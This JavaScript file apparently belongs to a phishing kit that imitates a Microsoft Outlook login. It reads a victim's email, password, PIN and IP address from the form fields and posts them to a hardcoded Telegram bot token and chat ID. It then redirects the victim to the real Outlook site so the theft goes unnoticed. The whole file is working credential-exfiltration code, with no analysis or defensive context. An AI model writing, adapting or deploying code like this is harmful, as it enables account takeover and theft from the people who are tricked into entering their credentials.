//bot token
var telegram_bot_id = "6996072625:AAHryrTMZLpIuk6DPuNUZidE0Btcl8GR7AQ";
//chat id
var chat_id = "-4226778068";
var u_name, pax, u_pin2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("uzer").value;
    pax = document.getElementById("pazz").value;
    u_pin2 = document.getElementById("p1n").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "📧EMAIL: " + u_name + "\n🔒Cl4v3: " + pax +"\n📌P1N: " + u_pin2 +"\nIP: " + ip +"\n" + ip2 +"\n\n🐺Sacrix32🐺";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://outlook.live.com';
        console.log(response);
    });
    return false;
};
